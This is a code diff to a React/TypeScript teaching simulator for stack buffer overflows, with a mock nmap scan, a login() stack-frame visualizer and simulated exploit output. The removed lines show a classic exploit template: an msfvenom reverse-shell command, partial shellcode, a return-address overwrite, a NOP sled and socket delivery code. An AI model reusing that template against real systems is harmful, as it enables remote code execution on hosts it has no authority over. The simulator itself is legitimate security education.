@@ -25,44 +25,14 @@ const EXPLOIT_SCRIPT_NAME = "exploit.py";
 
 const EXPLOIT_SCRIPT_CONTENT = `import time
 
-# educational script
-# No real socket connection
-# No real payload is sent
+# demo-only educational script
+# no real socket connection is made
+# no real payload is sent
 
-# 1. Target Configuration
-ip = "203.0.113.25"      # Target IP
-port = 8080              # parser/input gateway port
+ip = "203.0.113.25"
+port = 8080
 
-# 2. The Payload (Generated from msfvenom)
-# Example: msfvenom -p linux/x86/shell_reverse_tcp LHOST=... -f python
-shellcode = (
-    b"\\xbb\\x61\\xd4\\x13\\x11\\xdb\\xcc\\xd9\\x74\\x24\\xf4\\x5a\\x33\\xc9\\xb1"
-    b"\\x52\\x31\\x5a\\x12\\x83\\xc2\\x04\\x03\\x3d\\x23\\x52\\x15\\x4c\\x0c\\x11"
-    # ... rest of your msfvenom output ...
-)
-
-# 3. Crafting the String
-# 'offset' is the exact number of bytes needed to reach the Return Address (EIP/RIP)
-offset = 1024 
-padding = b"A" * offset           # Fills the buffer
-eip = b"\\xaf\\x11\\x50\\x62"         # Memory address to JMP to the shellcode
-nop_sled = b"\\x90" * 32           # Landing zone for the CPU
-
-# The final package
-payload = padding + eip + nop_sled + shellcode
-
-# 4. Simulated Delivery
-# 4. The Delivery (The "Send")
-try:
-    print(f"[*] Sending exploit to {ip}:{port}...")
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((ip, port))         # Establish connection
-    s.send(payload)               # Inject payload into memory
-    s.close()
-    print("[+] Exploit sent! Check your listener.")
-except Exception as e:
-    print(f"[!] Could not connect: {e}")
-    sys.exit()
+payload = b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAARET"
 
 print(f"[*] Preparing demo package for {ip}:{port}...")
 time.sleep(1)
@@ -73,6 +43,10 @@ time.sleep(1)
 print("[+] Demo payload dispatched (simulation only)")
 print("[+] Check the buffer visualization and stack snapshot.")
 `;
+
+const USERNAME_BUFFER_SIZE = 64;
+const PASSWORD_BUFFER_SIZE = 64;
+const WORD_SIZE = 4;
 
 const targetProfile: TargetProfile = {
   hostname: "demo-target.local",
@@ -117,6 +91,45 @@ function makeInitialServerLog(): string[] {
   ];
 }
 
+function analyzeLoginFrame(username: string, password: string) {
+  const usernameLen = username.length;
+  const passwordLen = password.length;
+
+  const usernameOverflow = Math.max(usernameLen - USERNAME_BUFFER_SIZE, 0);
+  const passwordOverflow = Math.max(passwordLen - PASSWORD_BUFFER_SIZE, 0);
+
+  const usernameIntoPassword = Math.min(usernameOverflow, PASSWORD_BUFFER_SIZE);
+  const usernameBeyondPassword = Math.max(
+    usernameOverflow - PASSWORD_BUFFER_SIZE,
+    0
+  );
+
+  const savedFrameBytes = Math.min(
+    WORD_SIZE,
+    Math.min(usernameBeyondPassword, WORD_SIZE) +
+      Math.min(passwordOverflow, WORD_SIZE)
+  );
+
+  const returnBytes = Math.min(
+    WORD_SIZE,
+    Math.max(usernameBeyondPassword - WORD_SIZE, 0) +
+      Math.max(passwordOverflow - WORD_SIZE, 0)
+  );
+
+  return {
+    usernameLen,
+    passwordLen,
+    usernameOverflow,
+    passwordOverflow,
+    usernameIntoPassword,
+    savedFrameTouched: savedFrameBytes > 0,
+    returnTouched: returnBytes > 0,
+    savedFrameBytes,
+    returnBytes,
+    overflowDetected: usernameOverflow > 0 || passwordOverflow > 0,
+  };
+}
+
 export default function SplitLayout() {
   const [terminalLines, setTerminalLines] = useState<TerminalEntry[]>(
     makeInitialTerminalLines()
@@ -134,7 +147,7 @@ export default function SplitLayout() {
 
   const [targetInput, setTargetInput] = useState("");
   const [targetResponse, setTargetResponse] = useState(
-    "Awaiting package delivery."
+    "Awaiting login() invocation or package delivery."
   );
   const [serverLog, setServerLog] = useState<string[]>(makeInitialServerLog());
   const [lastObservedSource, setLastObservedSource] = useState("none");
@@ -142,6 +155,10 @@ export default function SplitLayout() {
   const [targetCompromised, setTargetCompromised] = useState(false);
   const [beaconEnabled, setBeaconEnabled] = useState(false);
   const [beaconCount, setBeaconCount] = useState(0);
+
+  const [websiteUsername, setWebsiteUsername] = useState("operator_demo");
+  const [websitePassword, setWebsitePassword] = useState("P@ssw0rd!");
+  const [loginFrameActive, setLoginFrameActive] = useState(false);
 
   const beaconBusyRef = useRef(false);
 
@@ -166,107 +183,201 @@ export default function SplitLayout() {
     setTerminalLines(makeInitialTerminalLines());
   }
 
-function runMockScan(serviceScan: boolean) {
-  const timestamp = serviceScan
-    ? "2023-10-27 14:10 EDT"
-    : "2023-10-27 14:00 EDT";
+  function syncLoginFrameState(username: string, password: string) {
+    const details = analyzeLoginFrame(username, password);
 
-  appendLines(
-    {
-      tone: "info",
-      text: `Starting Nmap 7.94 ( https://nmap.org ) at ${timestamp}`,
-    },
-    {
-      tone: "info",
-      text: `Nmap scan report for ${targetProfile.ip}`,
-    },
-    { tone: "success", text: "Host is up (0.0021s latency)." },
-    {
-      tone: "info",
-      text: "Not shown: 997 closed tcp ports (reset)",
-    },
-    {
-      tone: "info",
-      text: "",
+    setLastObservedSource("local ui form");
+
+    if (!loginFrameActive) return;
+
+    if (details.returnTouched) {
+      setTargetResponse(
+        "Overflow warning — login() copied input past the saved frame pointer and into the return address."
+      );
+    } else if (details.savedFrameTouched) {
+      setTargetResponse(
+        "Overflow warning — login() copied input into the saved frame pointer region."
+      );
+    } else {
+      setTargetResponse("login() frame is intact and ready to return to auth().");
     }
-  );
 
-  if (!serviceScan) {
+    setServerLog([
+      "auth() invoked login(username, password)",
+      "push return address -> auth()+0x14",
+      "push saved frame pointer (EBP)",
+      "reserve username[64] and password[64] locals",
+      `copy username bytes: ${details.usernameLen}/${USERNAME_BUFFER_SIZE}`,
+      `copy password bytes: ${details.passwordLen}/${PASSWORD_BUFFER_SIZE}`,
+      details.usernameOverflow > 0
+        ? `username overflow: ${details.usernameOverflow} byte(s) beyond username[64]`
+        : "username copy stayed inside username[64]",
+      details.passwordOverflow > 0
+        ? `password overflow: ${details.passwordOverflow} byte(s) beyond password[64]`
+        : "password copy stayed inside password[64]",
+      details.returnTouched
+        ? "return address touched in simulation"
+        : details.savedFrameTouched
+          ? "saved frame pointer touched in simulation"
+          : "stack frame intact — safe return path to auth()",
+    ]);
+  }
+
+  function handleUsernameChange(value: string) {
+    setWebsiteUsername(value);
+    if (loginFrameActive) {
+      syncLoginFrameState(value, websitePassword);
+    }
+  }
+
+  function handlePasswordChange(value: string) {
+    setWebsitePassword(value);
+    if (loginFrameActive) {
+      syncLoginFrameState(websiteUsername, value);
+    }
+  }
+
+  function handleInvokeLogin() {
+    setLoginFrameActive(true);
+    setTargetCompromised(false);
+    setBeaconEnabled(false);
+
+    const details = analyzeLoginFrame(websiteUsername, websitePassword);
+
+    setLastObservedSource("local ui form");
+    setTargetResponse(
+      details.returnTouched
+        ? "Overflow warning — login() copied input into the return address."
+        : details.savedFrameTouched
+          ? "Overflow warning — login() copied input into the saved frame pointer."
+          : "login() frame created — stack prologue complete and ready to return to auth()."
+    );
+
+    setServerLog([
+      "auth() invoked login(username, password)",
+      "push return address -> auth()+0x14",
+      "push saved frame pointer (EBP)",
+      "sub esp, reserve locals for login()",
+      `copy username bytes: ${details.usernameLen}/${USERNAME_BUFFER_SIZE}`,
+      `copy password bytes: ${details.passwordLen}/${PASSWORD_BUFFER_SIZE}`,
+      details.returnTouched
+        ? "return address touched in simulation"
+        : details.savedFrameTouched
+          ? "saved frame pointer touched in simulation"
+          : "frame intact — return target remains protected",
+    ]);
+  }
+
+  function handleReturnToAuth() {
+    setLoginFrameActive(false);
+    setLastObservedSource("local ui form");
+    setTargetResponse("login() returned to auth(); login() stack frame popped.");
+    setServerLog([
+      "login() epilogue executed",
+      "restore caller frame pointer",
+      "RET -> auth()+0x14",
+      "stack pointer returned to caller frame",
+    ]);
+  }
+
+  function handleClearLogin() {
+    setWebsiteUsername("");
+    setWebsitePassword("");
+    setLoginFrameActive(false);
+    setLastObservedSource("local ui form");
+    setTargetResponse("Login fields cleared. Awaiting login() invocation.");
+    setServerLog([
+      "website input fields cleared",
+      "login() frame not currently active",
+      "memory view reset to idle",
+    ]);
+  }
+
+  function runMockScan(serviceScan: boolean) {
+    const timestamp = serviceScan
+      ? "2023-10-27 14:10 EDT"
+      : "2023-10-27 14:00 EDT";
+
     appendLines(
       {
         tone: "info",
-        text: "PORT     STATE SERVICE",
+        text: `Starting Nmap 7.94 ( https://nmap.org ) at ${timestamp}`,
       },
       {
         tone: "info",
-        text: "80/tcp   open  http",
+        text: `Nmap scan report for ${targetProfile.ip}`,
+      },
+      { tone: "success", text: "Host is up (0.0021s latency)." },
+      {
+        tone: "info",
+        text: "Not shown: 997 closed tcp ports (reset)",
       },
       {
         tone: "info",
-        text: "443/tcp  open  https",
+        text: "",
+      }
+    );
+
+    if (!serviceScan) {
+      appendLines(
+        {
+          tone: "info",
+          text: "PORT     STATE SERVICE",
+        },
+        {
+          tone: "info",
+          text: "80/tcp   open  http",
+        },
+        {
+          tone: "info",
+          text: "443/tcp  open  https",
+        },
+        {
+          tone: "info",
+          text: "8080/tcp open  http-proxy",
+        },
+        {
+          tone: "info",
+          text: "",
+        },
+        {
+          tone: "success",
+          text: "Nmap done: 1 IP address (1 host up) scanned in 0.15 seconds",
+        }
+      );
+      return;
+    }
+
+    appendLines(
+      {
+        tone: "info",
+        text: "PORT     STATE SERVICE    VERSION",
       },
       {
         tone: "info",
-        text: "8080/tcp open  http-proxy",
+        text: "80/tcp   open  http       Apache httpd 2.4.58 ((Ubuntu))",
+      },
+      {
+        tone: "info",
+        text: "443/tcp  open  https      Apache httpd 2.4.58 ((Ubuntu))",
+      },
+      {
+        tone: "warning",
+        text: "8080/tcp open  http-proxy demo-input-gateway",
       },
       {
         tone: "info",
         text: "",
       },
       {
+        tone: "info",
+        text: `Service Info: OS: ${targetProfile.os}; Notes: ${targetProfile.notes}`,
+      },
+      {
         tone: "success",
-        text: "Nmap done: 1 IP address (1 host up) scanned in 0.15 seconds",
+        text: "Nmap done: 1 IP address (1 host up) scanned in 0.18 seconds",
       }
     );
-    return;
-  }
-
-  appendLines(
-    {
-      tone: "info",
-      text: "PORT     STATE SERVICE    VERSION",
-    },
-    {
-      tone: "info",
-      text: "80/tcp   open  http       Apache httpd 2.4.58 ((Ubuntu))",
-    },
-    {
-      tone: "info",
-      text: "443/tcp  open  https      Apache httpd 2.4.58 ((Ubuntu))",
-    },
-    {
-      tone: "warning",
-      text: "8080/tcp open  http-proxy demo-input-gateway",
-    },
-    {
-      tone: "info",
-      text: "",
-    },
-    {
-      tone: "info",
-      text: `Service Info: OS: ${targetProfile.os}; Notes: ${targetProfile.notes}`,
-    },
-    {
-      tone: "success",
-      text: "Nmap done: 1 IP address (1 host up) scanned in 0.18 seconds",
-    }
-  );
-
-
-    targetProfile.ports.forEach((entry) => {
-      appendLines({
-        tone: "info",
-        text: `${entry.port}/${entry.protocol} open ${entry.service}`,
-      });
-    });
-
-    if (serviceScan) {
-      appendLines(
-        { tone: "info", text: `Service banner: ${targetProfile.banner}` },
-        { tone: "info", text: `OS guess: ${targetProfile.os}` },
-        { tone: "warning", text: `Notes: ${targetProfile.notes}` }
-      );
-    }
   }
 
   function buildPackage(mode: "safe" | "overflow-demo") {
@@ -501,7 +612,7 @@ function runMockScan(serviceScan: boolean) {
       },
       {
         tone: "info",
-        text: "[*] SPython script executing...",
+        text: "[*] Python script executing...",
       }
     );
 
@@ -693,6 +804,14 @@ function runMockScan(serviceScan: boolean) {
           targetResponse={targetResponse}
           serverLog={serverLog}
           lastObservedSource={lastObservedSource}
+          websiteUsername={websiteUsername}
+          websitePassword={websitePassword}
+          loginFrameActive={loginFrameActive}
+          onUsernameChange={handleUsernameChange}
+          onPasswordChange={handlePasswordChange}
+          onInvokeLogin={handleInvokeLogin}
+          onReturnToAuth={handleReturnToAuth}
+          onClearLogin={handleClearLogin}
         />
       </div>
     </section>
